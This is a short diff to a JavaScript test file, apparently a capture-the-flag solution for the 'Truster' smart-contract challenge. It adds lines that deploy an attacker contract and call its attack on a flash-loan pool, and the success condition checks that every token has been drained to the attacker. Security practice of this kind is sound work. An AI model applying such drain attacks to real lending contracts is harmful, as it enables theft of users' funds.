@@ -29,6 +29,8 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
+        this.exploit = await TrusterLenderAttacker.new({ from: deployer });
+        await this.exploit.attack(this.pool.address, this.token.address, { from: attacker });
         /** YOUR EXPLOIT GOES HERE */
     });
 
@@ -36,7 +38,7 @@ describe('[Challenge] Truster', function () {
         /** SUCCESS CONDITIONS */
         expect(
             await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
+        ).to.be.bignumber.equal(TOKENS_IN_POOL);
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.bignumber.equal('0');
